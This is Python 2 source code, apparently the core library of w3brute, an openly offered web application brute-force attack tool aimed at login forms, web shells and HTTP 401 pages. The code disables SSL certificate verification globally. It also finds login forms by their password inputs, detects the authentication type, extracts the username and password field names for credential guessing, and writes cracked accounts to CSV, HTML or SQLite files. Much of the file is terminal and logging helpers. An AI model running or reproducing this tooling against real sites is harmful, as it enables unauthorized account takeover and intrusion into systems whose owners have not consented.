#!/usr/bin/env python

# Copyright (c) 2018 W3brute Developers.
# See LICENSE for more details. 

import sys

sys.dont_write_bytecode = True

IS_PY3K = sys.version_info.major == 3
if IS_PY3K:
    msg = "[ERROR] your python version (%s) is not supported. " % sys.version.split()[0]
    msg += "w3brute runs with python version **2.6.x** or **2.7.x** "
    msg += "(visit https://www.python.org/downloads/)"
    exit(msg)

try:
    import array
    import codecs
    import cookielib
    import contextlib 
    import csv
    import errno
    import fcntl 
    import io
    import itertools
    import logging
    import optparse
    import os
    import platform
    import random
    import re
    import shutil
    import signal
    import socket
    import sqlite3
    import ssl
    import string
    import struct
    import subprocess
    import termios
    import textwrap
    import time
    import traceback
    import urllib
    import urllib2
    import urlparse
    import zipfile

except KeyboardInterrupt:
    msg = "[ERROR] user aborted"
    exit(msg)

try: # reference: https://stackoverflow.com/questions/27835619/urllib-and-ssl-certificate-verify-failed-error 
    ssl._create_default_https_context = ssl._create_unverified_context
except AttributeError:
    pass

try:
    from thirdparty.beautifulsoup.beautifulsoup import BeautifulSoup
    from thirdparty.clientform.clientform import ParseResponse as ParseForm
    from thirdparty.colorama import ansi
    from thirdparty.colorama import AnsiToWin32
    from thirdparty.colorama import Fore
    from thirdparty.colorama import init as coloramainit
    from thirdparty.colorama import Style
    from thirdparty.termcolor.termcolor import colored as warnai

except ImportError, err:
    module = err.message.split()[-1]
    msg = "[CRITICAL] module: %s missing. " % repr(module)
    msg += "please download on https://github.com/aprilahijriyan/w3brute"
    exit(msg)

except KeyboardInterrupt:
    msg = "[ERROR] user aborted"
    exit(msg)

AUTHOR = "Aprila Hijriyan"
VERSION = "1.0"
VERSION_STRING = "w3brute-%s#dev" % VERSION
DESCRIPTION = "Automatic Web Application Brute Force Attack Tool"
HOMEPAGE = "https://github.com/aprilahijriyan/w3brute"
LICENSE = "LGPLv3"

BANNER = r"""
                        /',            ,'\
                       /gg\            /gg\
                      /g.gg\          /gg.g\
                     |gg..gg\        /gg..gg|
                     |gg...g|        |g...gg|
                     |gg...g|        |g...gg|
                      \gg..g/        \g..gg/
                       )gg.gvgggggggggvg.gg(
                      /ggggggggggggggggggggg\
                     /gggg(((ggggggggg)))gggg\
                     |ggggg....ggggg....ggggg|
                     |ggggg....ggggg....ggggg|
                     |ggcccgggg\___/ggggcccgg|
                     |ggcccccgggg|ggggcccccgg|
                       \gcccggg\---/gggcccg/
                          \ggggggggggggg/
                        
                         (%(VERSION)s)
              %(HOMEPAGE)s
        _______________________________________________________
+ -- -=[ Automatic Web Application Brute Force Attack Tool     ]
+ -- -=[ Supported Web Types: Web Shell, HTTP 401 UNAUTHORIZED ]
+ -- -=[_______________________________________________________]

"""

class W3bruteBaseException(Exception):
    pass

class W3bruteNextStepException(W3bruteBaseException):
    pass

class W3bruteQuitException(W3bruteBaseException):
    pass

class W3bruteRedirectException(W3bruteBaseException):
    pass

class W3bruteSkipParsingFormException(W3bruteBaseException):
    pass

class W3bruteSkipTargetException(W3bruteBaseException):
    pass

class W3bruteStopBruteForceException(W3bruteBaseException):
    pass

class PyDict(dict):
    """
    >>> beli = PyDict()
    >>> beli.cewe = 1
    >>> beli.cewe
    1
    
    >>> beli = PyDict(perawan=1, janda=2)
    >>> beli.perawan
    1
    >>> beli.janda
    2
    
    """
    
    def __init__(self, data={}, **kwargs):
        # initialisasi data
        kwargs.update(data)
        
        dict.__init__(self, kwargs)
    
    def __setattr__(self, name, value):
        # atur atribut --> x.item = value
        self.__setitem__(name, value)
    
    def __getattr__(self, name):
        # mendapatkan nilai atribut --> x.item
        return self.__getitem__(name)
    
    def __delattr__(self, name):
        # menghapus atribut --> del x.item
        self.__delitem__(name)
    
    def __getitem__(self, name):
        # mendapatkan nilai item -> x["item"]
        try:
            return dict.__getitem__(self, name)
        except KeyError:
            return None # jika item tidak ada di dict
    
    # def __getstate__(self):
    #     return self.__dict__
    #
    # def __setstate__(self, dict):
    #     self.__dict__ = dict
    #
    # def copy(self):
    #     import cPickle
    #     return cPickle.loads(cPickle.dumps(self))

class PrettyHelpFormatter(optparse.IndentedHelpFormatter):
    """
    NOTE: formatter optparse ini berasal dari pip._internal.baseparser.py
    """
    
    def __init__(self, *args, **kwargs):
        kwargs["max_help_position"] = 35
        kwargs["indent_increment"] = 2
        kwargs["width"] = getTerminalSize()[0] - 2
        
        optparse.IndentedHelpFormatter.__init__(self, *args, **kwargs)
    
    def format_option_strings(self, option, format=" <%s>", separator=", "):
        opts = []
        
        if option._short_opts:
            opts.append(option._short_opts[0])
        
        if option._long_opts:
            opts.append(option._long_opts[0])
        
        if len(opts) > 1:
            opts.insert(1, separator)
        
        if option.takes_value():
            metavar = option.metavar or option.dest.lower()
            metavar = format % metavar
            opts.append(metavar)
        
        return "".join(opts)

class InterruptHandler(object):
    """
    fungsi kelas ini untuk menghandle sinyal interrupt
    dari CTRL - C dan CTRL - Z secara otomatis
    reference: https://unix.stackexchange.com/questions/256799/ctrlc-and-ctrlz-to-interrupt-suspend-jobs 
    """
    
    def __init__(self):
        self.setupHandler()
    
    def setupHandler(self, handler=None):
        """
        mengatur interrupt handler
        """
        
        if handler is None:
            handler = self.defaultHandler
        
        self.handler = handler
        signal.signal(signal.SIGINT, handler) # signal.SIGINT = sinyal CTRL - C
        signal.signal(signal.SIGTSTP, handler) # signal.SIGTSTP = sinyal CTRL - Z
    
    def defaultHandler(self, signum, frame):
        """
        interrupt handler
        """
        
        if isinstance(konf.handleInterrupt, bool) and not konf.handleInterrupt:
            raise W3bruteNextStepException
        
        if not hasattr(self, "sudah"):
            warnMsg = "interrupt detected"
            logger.warning(warnMsg)
            self.sudah = True
        
        try:
            msg = "[ASK] what do you want? [(C)ontinue (default) / (s)kip target / (q)uit]: "
            jawaban = raw_input(msg).lower() or "c"
            if jawaban.startswith("c"):
                pass
            
            elif jawaban.startswith("s"):
                raise KeyboardInterrupt
            
            elif jawaban.startswith("q"):
                errMsg = "[ERROR] user quit\n"
                cetakData(errMsg)
                
                if konf.bruteSession:
                    raise W3bruteStopBruteForceException
                 
                raise W3bruteQuitException
            
            else:
                warnMsg = "[WARNING] invalid choice: %s\n" % repr(jawaban)
                cetakData(warnMsg)
                raise W3bruteSkipTargetException
        
        except KeyboardInterrupt:
            errMsg = "[ERROR] user stopped\n"
            cetakData(errMsg)
            
            if konf.bruteSession:
                raise W3bruteStopBruteForceException
            
            raise W3bruteSkipTargetException
        
        except RuntimeError:
            errMsg = "user aborted"
            logger.error(errMsg)
            raise W3bruteQuitException

class ColorizedStreamHandler(logging.StreamHandler):
    def __init__(self, stream):
        logging.StreamHandler.__init__(self, stream)
        
        if IS_WIN:
           stream = AnsiToWin32(stream)
        
        self.stream = stream 
        # untuk :func: cetakData()
        konf.colored = self.colored
    
    def colored(self):
        """
        cek jika pesan bisa di warnai
        """
        
        if not konf.noColor:
            _ = self.stream
            if isinstance(_, AnsiToWin32):
                _ = _.wrapped
            
            if hasattr(_, "isatty") and _.isatty():
                return True
            
            if os.getenv("TERM", "").lower() == "ansi":
                return True
        
        return False
    
    def emit(self, record):
        """
        cetak pesan
        """
        
        try:
            message = self.format(record) + "\n"
            self.stream.write(message)
            
            if hasattr(self.stream, "flush"):
                self.stream.flush()
        
        except (SystemExit, KeyboardInterrupt):
            raise
        except IOError:
            pass
        except:
            self.handleError(record)
    
    def mesgColored(self, msg):
        """
        mewarnai pesan
        """
        
        if self.colored():
            levelname = getLevelName(msg)
            color = getLevelColor(levelname, bold=True)
            msg = formatMessage(msg, levelname, color)
        
        return msg
    
    def format(self, record):
        """
        format pesan
        """
        
        msg = logging.StreamHandler.format(self, record)
        return self.mesgColored(msg)

class Progress(InterruptHandler):
    """
    simpel text progress
    """
    
    def __init__(self, message=None):
        InterruptHandler.__init__(self)
        
        self.setupHandler(self.newHandler)
        
        self.message = message
        self.curmesg = None
        self.width = getTerminalSize()[0]
        
        # menambahkan handler untuk menghandle jika ukuran terminal berubah
        # reference: https://stackoverflow.com/questions/16941885/want-to-resize-terminal-windows-in-python-working-but-not-quite-right 
        signal.signal(signal.SIGWINCH, self.handleResize)
    
    def write(self, msg):
        """ 
        cetak data ke terminal
        """
        
        clearLine()
        # simpan pesan, yang nantinya akan digunakan oleh
        # fungsi newline()
        self.curmesg = msg
        
        msg = self.message + msg
        if len(msg) >= self.width:
            # untuk lebar terminal kurang dari 51
            # pesan akan secara otomatis di pendekan.
            if self.width <= 50:
                if not konf.disableWrap:
                    msg = textwrap.wrap(msg, self.width)[0][:-4] + "..."
                else:
                    konf.garisBaru = True
            else:
                konf.garisBaru = True
        
        msg = msg.ljust(self.width)
        
        if konf.colored():
            msg = Fore.GREEN + msg + Style.RESET_ALL
        
        cetakData(msg)
    
    def newline(self, msg):
        """
        mencetak text dan pindah ke garis baru
        """
        
        clearLine()
        
        if konf.colored():
            color = Fore.LIGHTGREEN_EX
            bold = Fore.LIGHTWHITE_EX
            reset = Style.RESET_ALL
            levelname = getLevelName(msg)
            msg = bold + msg.replace(levelname, color + levelname + reset)
            text = re.search("\((.+)\)", msg).group(1)
            msg = msg.replace(text, color + text + reset)
            
            if ":" not in self.curmesg:
                self.curmesg = warnai(self.curmesg, "green", attrs=["bold", "underline"])
            else:
                usr, psw = self.curmesg.split(" : ")
                self.curmesg = warnai(usr, "green", attrs=["bold", "underline"]) + " : " + warnai(psw, "green", attrs=["bold", "underline"])
        
        msg = msg.format(self.curmesg)
        msg += "\n"
        
        cetakData(msg)
    
    def finish(self):
        """ 
        atur ulang sinyal
        """
        
        signal.signal(signal.SIGWINCH, signal.SIG_DFL)
    
    def handleResize(self, signum, frame):
        """
        update ukuran terminal
        """
        
        self.width = getTerminalSize()[0]
    
    def newHandler(self, signum, frame):
        """
        interrupt handler untuk menghandle interupsi
        yang sedang 'menggunakan text progress' ini.
        """
        
        clearLine()
        self.finish()
        self.defaultHandler(signum, frame)
        # reference: https://stackoverflow.com/questions/16941885/want-to-resize-terminal-windows-in-python-working-but-not-quite-right 
        signal.signal(signal.SIGWINCH, self.handleResize)

class Spinner(object):
    """
    progress spinner
    """
    
    def __init__(self, message, maxval=None, suffix="%(percent)d%%"):
        self.message = message
        self.marker = itertools.cycle(list("|/-\\"))
        self.curlen = 0
        self.curval = 0
        self.maxval = maxval or 100
        self.suffix = suffix
        self.width = getTerminalSize()[0]
        self.curmesg = None
        self._pretty_spinner = False
        self._show_proses_lengkap = True
        
        ignoreInterrupt()
        
        # menambahkan handler untuk menghandle jika ukuran terminal berubah
        # reference: https://stackoverflow.com/questions/16941885/want-to-resize-terminal-windows-in-python-working-but-not-quite-right 
        signal.signal(signal.SIGWINCH, self.handleResize)
        
        cetakData(message)
    
    def __getitem__(self, name):
        """
        memberikan nilai item
        """
        
        return getattr(self, name, "")
    
    @property
    def percent(self):
        """
        persentase progress
        """
        
        return (self.curval * 100) / self.maxval
    
    def write(self, msg):
        """
        cetak karakter/pesan ke terminal
        """
        
        backspace = "\b" * self.curlen
        self.curlen = max(self.curlen, len(msg))
        if konf.colored():
            spin = msg[-1]
            msg = msg[:-1] + random.choice(Fore.__dict__.values()) + spin
        
        msg = backspace + msg.ljust(self.curlen)
        cetakData(msg)
    
    def show_progress(self):
        """
        menampilkan spinner progress
        """
        
        # update value
        self.curval += 1
        if not self._show_proses_lengkap:
            self.suffix = "%(percent)d%%"
        
        suffix = self.suffix % self
        char = self.marker.next()
        msg = "%(suffix)s %(spin)s" % dict(suffix=suffix, spin=char)
        self.curmesg = msg
        self.write(msg)
        self.checkLength()
    
    def checkLength(self):
        """
        memeriksa panjang pesan
        """
        
        if len(self.message + self.curmesg) >= self.width:
            self._show_proses_lengkap = False
            self.curlen = 0
            if not hasattr(self, "_sudah_di_perbaiki"):
                self._sudah_di_perbaiki = True
                clearLine()
            
            cetakData(self.message)
    
    def handleResize(self, signum, frame):
        """
        update ukuran terminal
        """
        
        self.width = getTerminalSize()[0]
    
    def resetSignal(self):
        """ 
        atur ulang sinyal handler ke default 
        """
        
        signal.signal(signal.SIGWINCH, signal.SIG_DFL) 
    
    def done(self, msg=""):
        """ 
        cetak pesan selesai
        """
        
        clearLine()
        cetakData(msg)
        
        if msg: # jika msg bukan null
            # pindah ke garis baru.
            cetakData("\n")
        
        # aktifkan kembali interrupt handler
        ignoreInterrupt(False)
        self.resetSignal() 

class OutputWriter(object):
    """
    simpel mesin pembuat file hasil
    didukung tipe file format (csv, html or sqlite3)
    format csv (default)
    """
    
    # reference: https://www.w3schools.com/css/css_table.asp 
    HTML_FORMAT = string.Template(textwrap.dedent("""\
    <html>
        <title>W3brute - Automatic Web Application Brute Force Attack Tool</title>
        <head>
            <style>
                #result_w3brute {
                    font-family: \"Trebuchet MS\", Arial, Helvetica, sans-serif;
                    border-collapse: collapse;
                    width: 100%;
                }
                
                #result_w3brute td, #result_w3brute th {
                    border: 1px solid #ddd;
                    padding: 8px;
                }
                
                #result_w3brute tr:nth-child(even) {
                    background-color: #f2f2f2;
                }
                
                #result_w3brute tr:hover {
                    background-color: #ddd;
                }
                
                #result_w3brute th {
                    padding-top: 12px;
                    padding-bottom: 12px;
                    text-align: left;
                    background-color: ${bg_color};
                    color: white;
                }
            </style>
        </head>
        <body>
            ${html_table}
        </body>
    </html>\
    """))
     
    def __init__(self, fp, fieldnames, format):
        self.fp = fp
        self.fieldnames = fieldnames
        
        if format.lower() not in ("csv", "html", "sqlite3"):
            raise TypeError("file format: %s is not supported" % repr(format))
        
        if format.lower() == "sqlite3":
            self.fp = sqlite3.connect(fp.name)
        
        self.format = format
        self._html_table = "<table id=\"result_w3brute\">\n"
        
        self.init()
    
    def init(self):
        if self.format == "csv":
            self.writer = csv.DictWriter(self.fp, self.fieldnames)
            self.writer.writeheader()
        
        elif self.format == "sqlite3":
            # buat table untuk tempat hasil.
            # table:
            # 1.) accounts; untuk daftar akun
            # 2.) passwords; untuk daftar password (web shell)
            
            self.table_name = "accounts" if len(self.fieldnames) > 3 else "passwords"
            self.fieldnames.pop(0)
            self.fieldnames.insert(0, "id")
            # tipe parameter table
            types = ["INTEGER"] + (["TEXT"] * len(self.fieldnames[1:]))
            # parameter table
            param = ""
            for _ in zip(self.fieldnames, types):
                param += " ".join(_) + ", "
            
            param = param[:-2]
            data = dict(name=self.table_name, param=param)
            self.cursor = self.fp.cursor()
            self.cursor.execute("create table %(name)s (%(param)s)" % data)
        
        else:
            self._html_table += "            <tr>\n"
            for header in self.fieldnames:
                self._html_table += "                <th>%s</th>\n" % header
            
            self._html_table += "            </tr>\n"
    
    def add_row(self, *args):
        if self.format == "csv":
            row = dict()
            for i in range(len(args)):
                key = self.fieldnames[i]
                value = args[i]
                row[key] = value
            
            self.writer.writerow(row)
        
        elif self.format == "sqlite3":
            param = ", ".join(list("?" * len(args)))
            data = dict(table=self.table_name, param=param)
            self.cursor.execute("insert into %(table)s values(%(param)s)" % data, args)
        
        else:
            self._html_table += "            <tr>\n"
            
            for _ in args:
                self._html_table += "                <td>%s</td>\n" % _
            
            self._html_table += "            </tr>\n"
    
    def close(self):
        """
        tutup file dan simpan
        """
        
        if self.format == "csv":
            self.fp.close()
        
        elif self.format == "sqlite3":
            self.fp.commit()
            self.fp.close()
        
        else:
            self._html_table += "        </table>"
            html = self.HTML_FORMAT.substitute(html_table=self._html_table, bg_color=randomHexColor())
            self.fp.write(html)
            self.fp.close()

class DisableRedirect(urllib2.HTTPRedirectHandler):
    """
    tidak mengijinkan redirect 
    ini digunakan untuk proses verifikasi
    """
    
    def redirect_request(self, *_):
        raise W3bruteRedirectException 

class UserAgent(object):
    """
    simpel URL opener
    """
    
    @staticmethod
    def open(url, authCred=None, allow_redirects=True):
        # mengatur timeout
        socket.setdefaulttimeout(konf.timeout)
        
        # atur user-agent header
        headers = {"User-Agent": konf.agent}
        
        if isinstance(url, urllib2.Request):
            url.headers = headers
            req = url
        else:
            req = urllib2.Request(url, headers=headers)
        
        handlers = []
         
        if isinstance(authCred, tuple):
            # reference: https://docs.python.org/2/howto/urllib2.html 
            passw_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
            if auth.type == "digest":
                authHandler = urllib2.HTTPDigestAuthHandler(passw_mgr)
            else:
                authHandler = urllib2.HTTPBasicAuthHandler(passw_mgr)
            
            authHandler.add_password(None, req.get_full_url(), *authCred) 
            handlers.append(authHandler)
        
        if konf.proxy or urllib.getproxies():
            # reference: http://www.learntosolveit.com/python/web_urllib2_proxy_auth.html 
            proxyDict = getProxy() if konf.proxy else urllib.getproxies() 
            proxyHandler = urllib2.ProxyHandler(proxyDict)
            handlers.append(proxyHandler)
            if "@" in " ".join(proxyDict.values()):
                handlers.append(urllib2.HTTPBasicAuthHandler())
                handlers.append(urllib2.HTTPHandler)
        
        cookieJar = cookielib.CookieJar()
        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
        handlers.append(cookieHandler)
        
        if not allow_redirects:
            disableRedirect = DisableRedirect()
            handlers.append(disableRedirect)
        
        opener = urllib2.build_opener(*handlers)
        urllib2.install_opener(opener)
        
        try:
            return urllib2.urlopen(req)
        except urllib2.HTTPError, ex:
            return ex
        except urllib2.URLError, ex:
            errcode, message = ex.reason
            
            if errcode == errno.ENOENT:
                errMsg = "internet connection is not detected"
                logger.error(errMsg)
                
                raise W3bruteQuitException
            
            elif errcode == errno.E2BIG:
                errMsg = "host %s doest not exist" % repr(target.HOST)
                logger.error(errMsg)
                
                raise W3bruteSkipTargetException
            
            elif errcode == errno.ETIMEDOUT:
                warnMsg = "w3brute get a response '%s' (%d). " % (message, errcode)
                warnMsg += "try to re-connect..."
                logger.warning(warnMsg)
                
                tidur = False
                for i in xrange(konf.retries):
                    if not tidur:
                        # tidur sebentar dan mencoba
                        # untuk terhubung kembali.
                        time.sleep(konf.delay)
                        tidur = True
                    
                    try:
                        return urllib2.urlopen(req)
                    except:
                        # tidur lagi, habis begadang :)
                        time.sleep(konf.delay) 
                
                criMsg = "failed to connect to server. "
                criMsg += "please check your internet connection."
                logger.critical(criMsg)
                
                raise W3bruteQuitException
            
            else:
                # FIXME: how to fix this?
                if "Interrupted" in message:
                    clearLine()
                    logger.critical(message)
                    raise W3bruteSkipTargetException
                
                errMsg = "your internet connection has a problem. "
                errMsg += "connection response '%s' (%d)" % (message, errcode)
                logger.error(errMsg)
                
                raise W3bruteQuitException

class ParseResponse(object):
    """
    menguraikan html
    """
    
    def __init__(self, response):
        htmltext = response.read()
        source = io.BytesIO(htmltext)
        source.geturl = response.geturl
        self.forms = ParseForm(source)
        self.soup = BeautifulSoup(htmltext)
    
    @property
    def title(self):
        """
        :return: judul halaman
        """
        
        elem = self.soup.find("title")
        return str(elem.text)
    
    def getValidForms(self):
        """
        fungsi ini untuk mendapatkan form 
        yang menuju ke dashboard website
        """
        
        if auth.IS_AUTHORIZATION:
            # skip...
            return;
        
        infoMsg = "[INFO] try searching for form that goes to the website dashboard...\n"
        cetakData(infoMsg)
        
        try:
            for form in self.forms:
                input_controls = form.controls
                
                for input_elem in input_controls:
                    input_type = input_elem.type
                    
                    # jika input type 'password' ditemukan
                    # itu berarti form tersebut menuju ke
                    # dashboard website.
                    if input_type == "password":
                        html.form = form
                        html.soup = self.soup.find("form", attrs=form.attrs)
                        
                        raise W3bruteSkipParsingFormException
            
        except W3bruteSkipParsingFormException:
            infoMsg = "form that goes to the website dashboard is found"
            logger.info(infoMsg)
        
        else:
            criMsg = "form that goes to the website dashboard is not found. "
            
            if not konf.adminScanner:
                criMsg += "try using the '--admin' option to help you "
                criMsg += "find the admin login page."
            
            logger.critical(criMsg)
            raise W3bruteSkipTargetException
    
    def getTipeAutentikasi(self):
        """
        mendapatkan tipe autentikasi target
        """
        
        infoMsg = "[INFO] detecting target authentication type...\n"
        cetakData(infoMsg)
        
        if auth.IS_AUTHORIZATION:
            infoMsg = "authentication type: %s Authorization" % repr(auth.type.capitalize())
            logger.info(infoMsg)
            
            return;
        
        soup = html.soup
        
        if soup.find("input", type="text"):
            if re.search("(?i)email", str(soup)):
                auth_type = "email"
                auth.IS_EMAIL_AUTH = True
            else:
                auth_type = "standard"
                auth.IS_STANDARD_AUTH = True
        
        elif soup.find("input", type="email"):
            auth_type = "email"
            auth.IS_EMAIL_AUTH = True
        
        else:
            infoMsg = "page title %s" % repr(self.title)
            logger.info(infoMsg)
            
            auth_type = "web shell"
            auth.IS_WEBSHELL_AUTH = True
        
        infoMsg = "authentication type: %s" % repr(auth_type)
        logger.info(infoMsg)
    
    def getParameterForm(self):
        if auth.IS_AUTHORIZATION:
            # skip lagi...
            return;
        
        infoMsg = "[INFO] find parameter(s)...\n"
        cetakData(infoMsg)
        
        soup = html.soup
        html.field = PyDict()
        
        if auth.IS_WEBSHELL_AUTH is None:
            input_elem = soup.find("input", type="text") \
                or soup.find("input", type="email")
            
            if not input_elem.has_key("name"):
                errMsg = "parameter(s) not found in %s" % repr(str(input_elem))
                logger.error(errMsg)
                
                raise W3bruteSkipTargetException
            
            html.field.username = input_elem.get("name")
        
        input_elem = soup.find("input", type="password")
        
        if not input_elem.has_key("name"):
            errMsg = "parameter(s) not found in %s" % repr(str(input_elem))
            logger.error(errMsg)
            
            raise W3bruteSkipTargetException
        
        html.field.password = input_elem.get("name")

def banner():
    """
    menampilkan logo w3brute
    """
    
    coloramainit()
    
    ac = [Fore.GREEN, Fore.LIGHTGREEN_EX]
    bc = [Fore.RED, ansi.code_to_chars("41")]
    cc = {
        "g": ac,
        ".": bc
    }
    
    _ = BANNER
    for k, v in cc.items():
        rc = random.choice(v)
        _ = _.replace(k, rc + k + Style.RESET_ALL)
    
    old = re.findall(r": (.*) ]", _)[0]
    new = Fore.LIGHTRED_EX + old.replace(", ", Style.RESET_ALL + ", " + Fore.LIGHTBLUE_EX) + Style.RESET_ALL
    _ = _.replace(old, new)
    
    data = {}
    data["VERSION"] = Fore.YELLOW + VERSION_STRING + Style.RESET_ALL
    data["HOMEPAGE"] = warnai(HOMEPAGE, "white", attrs=["underline"])
    
    cetakData(_ % data)

def randomHexColor():
    """
    warna acak untuk hasil file format (.html)
    """
    
    r = random.randint(0, 255)
    g = random.randint(0, 255)
    b = random.randint(0, 255)
    color = "#%x%x%x" % (r, g, b)
    return color

# reference: https://stackoverflow.com/questions/566746/how-to-get-linux-console-window-width-in-python 
if hasattr(shutil, 'get_terminal_size'):
    def getTerminalSize():
        """
        return (width, height)
        """
        return tuple(shutil.get_terminal_size())
else:
    def getTerminalSize():
        """
        return (width, height)
        """
        def ioctl_GWINSZ(fd):
            try:
                cr = struct.unpack_from(
                    'hh',
                    fcntl.ioctl(fd, termios.TIOCGWINSZ, '12345678')
                )
            except Exception:
                return None
            
            if cr == (0, 0):
                return None
            
            return cr
        
        cr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)
        if not cr:
            try:
                fd = os.open(os.ctermid(), os.O_RDONLY)
                cr = ioctl_GWINSZ(fd)
                os.close(fd)
            except Exception:
                pass
        
        if not cr:
            # coba ini... jika tidak berhasil mendapatkan ukuran terminal.
            cr = array.array('h', fcntl.ioctl(sys.stdout, termios.TIOCGWINSZ, '12345678'))[:2] 
        
        if not cr:
            cr = (os.environ.get('LINES', 40), os.environ.get('COLUMNS', 80))
        
        # width, height
        return int(cr[1]), int(cr[0])

def replaceSlice(object_, start, end, new):
    """
    mengganti karakter sesuai *letak posisi* dari karakter tersebut.
    
    :param object_: objek harus didukung :meth: slicing
    :param start: index (awal) karakter
    :param end: index (akhir) karakter
    :param new: karakter baru untuk pengganti karakter lama
    
    """
    
    try:
        a, c = object_[:start], object_[end:]
    except TypeError, err:
        tobject = err[0].split()[0]
        raise TypeError("%s object is not supported by slicing method" % tobject)
    
    b = type(object_)(new)
    object_ = a + b + c
    return object_

def getLevelName(msg):
    """
    mendapatkan nama (level)
    dari pesan.
    """
    
    match = re.search("\[(.+)\]", msg)
    lv = match.group(1).upper() if match else None
    return lv

def getLevelColor(lv, bold=False):
    """
    mendapatkan warna level
    
    :param bold: jika `True` return warna bold
    
    """
    
    # warna untuk :func: cetakData()
    soft_color = {
        "INFO": Fore.GREEN,
        "ERROR": Fore.RED,
        "WARNING": Fore.YELLOW
    }
    # warna untuk :func: logger
    bold_color = {
        "INFO": Fore.LIGHTGREEN_EX,
        "ERROR": Fore.LIGHTRED_EX,
        "WARNING": Fore.LIGHTYELLOW_EX
    }
    
    if lv == "CRITICAL":
        color = ansi.code_to_chars("41")
    else:
        color = soft_color[lv] if not bold else bold_color[lv]
    
    return color

def formatMessage(msg, lv, color):
    """
    format warna pesan
    """
    
    white = Fore.LIGHTWHITE_EX
    reset = Style.RESET_ALL
    msg = white + msg.replace(lv, color + lv + \
        (reset + white if lv == "CRITICAL" else white)
    )
    
    if lv == "CRITICAL":
        color = Fore.RED
    
    qmsg = []
    for match in re.finditer(r"'(.*?)'", msg):
        if match:
            text = color + "'" + Fore.WHITE + match.group(1) + color + "'"
            qmsg.append((match.start(), match.end(), text))
    
    qmsg.reverse()
    for start, end, text in qmsg:
        msg = replaceSlice(msg, start, end, text)
    
    msg = msg.replace("] ", "] " + color) + reset
    return msg

def clearLine():
    """
    membersihkan line di terminal
    """
    
    line = "\r%s\r" % (" " * getTerminalSize()[0])
    cetakData(line)

def cetakData(msg):
    """
    cetak data tanpa pindah baris secara otomatis
    """
    
    if msg.startswith("[") and konf.colored():
        levelname = getLevelName(msg)
        color = getLevelColor(levelname)
        msg = formatMessage(msg, levelname, color)
        match = re.search("\#(\d+)", msg)
        if match:
            num = "#" + match.group(1)
            msg = msg.replace(num, Fore.LIGHTCYAN_EX + num + color)
    
    try:
        stream.write(msg)
        if hasattr(stream, "flush"):
            stream.flush()
    
    except IOError:
        pass

def getOutputDir():
    """ 
    cek dan memberikan output directory
    """
    
    outdir = konf.outputDir
    if not os.path.exists(outdir):
        try:
            os.mkdir(outdir)
        except OSError, ex:
            if "no space left" in ex.args[1]:
                raise W3bruteQuitException(*ex.args)
            
            warnMsg = "[WARNING] %s %s. use default output directory %s\n" % (ex.args[1], repr(outdir), repr(defaults.outputDir))
            cetakData(warnMsg)
            
            # atur kembali ke default output directory
            # jika directory yang anda masukan tidak valid.
            outdir = konf.outputDir = defaults.outputDir
            if not os.path.exists(outdir):
                os.mkdir(outdir)
    
    if outdir.endswith("/"):
        outdir = outdir.rstrip("/")
    
    return outdir

def createFileObject(filename=None, format=None, buat_target_dir=True):
    """
    membuat file-object untuk membuat file hasil 
    """
    
    basedir = getOutputDir()
    
    if buat_target_dir:
        dirname = "/" + urllib.splitport(target.HOST)[0]
    else:
        dirname = "/dorking"
    
    outdir = basedir + dirname
    if not os.path.exists(outdir):
        try:
            os.mkdir(outdir)
        except OSError, ex:
            if "no space left" in ex.args[1]:
                raise W3bruteQuitException(*ex.args)
            
            warnMsg = "[WARNING] '%s' '%s'. use default output directory '%s'\n" % (ex.args[1], outdir, defaults.outputDir)
            cetakData(warnMsg)
            
            # atur kembali ke default output directory
            # jika directory yang anda masukan tidak valid.
            konf.outputDir = defaults.outputDir
            outdir = getOutputDir()
            outdir = outdir + dirname
            if not os.path.exists(outdir):
                os.mkdir(outdir)
    
    filename = konf.filename if filename is None else filename
    format = konf.fileFormat if format is None else format
    
    fp = outdir + "/" + filename + "." + format
    try:
        fp = open(fp, "w")
    except IOError:
        default_fp = outdir + "/" + defaults.filename + "." + format 
        warnMsg = "can't create %s file. " % repr(fp)
        warnMsg += "use default file result %s" % repr(default_fp)
        logger.warning(warnMsg)
        
        fp = open(default_fp, "w")
    
    return fp

def parseSlice(obj):
    """
    menguraikan slice syntax (string)
    """
    
    _ = None
    
    if obj is None:
        # .
        return slice(0, None)
    
    if obj.startswith(":"):
        obj = obj[1:]
    
    if obj.endswith(":"):
        obj = obj[:-1]
    
    if ":" in obj:
        _ = []
        val = obj.split(":")
        
        for v in val:
            try: int(v) # slice object harus tipe integer. 
            except: pass
            else: _.append(int(v))
        
        if len(_) == 0:
            _ = [0, None]
        
        elif len(_) == 1:
            _ = [_[0], None]
        
        elif len(_) == 2:
            start = _[0]
            stop = _[1] or None
            _ = [start, stop]
        
        elif len(_) >= 3:
            _ = _[0:3]
    
    else:
        start = 0
        try: int(obj)
        except: pass
        else: start = int(obj)
        
        _ = [start, None]
    
    return slice(*_)

def stringToList(s, sep=","):
    """
    membuat tipe data string atau (file) ke tipe data list
    """
    
    if "\r" in s:
        # * newline style:
        if "\n" in s:
            # Windows
            s = s.replace("\r", "")
        else:
            # Mac OS
            s = s.split("\r")
            return s
    
    if "\n" in s:
        # linux
        _ = s.splitlines()
    
    elif sep in s:
        if s.startswith(sep):
            s = s.lstrip(sep)
        
        if s.endswith(sep):
            s = s.rstrip(sep)
        
        if sep in s:
            _ = s.split(sep)
        else:
            _ = [s]
    
    else:
        _ = [s]
    
    return _

def openFile(f):
    """
    membuka file
    """
    
    try:
       with contextlib.closing(codecs.open(f, mode="r", encoding=sys.getfilesystemencoding())) as f:
           return f.read()
    
    except Exception:
        errMsg = getErrorMessage()
        logger.critical(errMsg)
        raise W3bruteQuitException

def is_zipfile(object_):
    """
    mencocokan syntax (jika anda menggunakan file zip)
    
    :rtype: boolean
    
    """
    
    if re.search(r".*;[\w.-]+(?:$|\:.*$)", object_):
        return True
    
    return False

def parseZipSyntax(object_):
    """ menguraikan syntax untuk file zip
    
    :syntax: <filepath><;filename><[:password]>
    
    :filepath: (e.g. /path/to/file.zip)
    :filename: (e.g. usernames.txt)
    :password: (e.g. mypass) (optional)
    
    :example: /path/to/file.zip;usernames.txt:mypass
    
    :rtype: tuple
    
    """
    
    filepath = filename = password = None
    if ";" in object_:
        filepath, filename = object_.split(";", 1)
    
    if filename is not None:
        if ":" in filename:
            filename, password = filename.split(":", 1)
    
    return filepath, filename, password

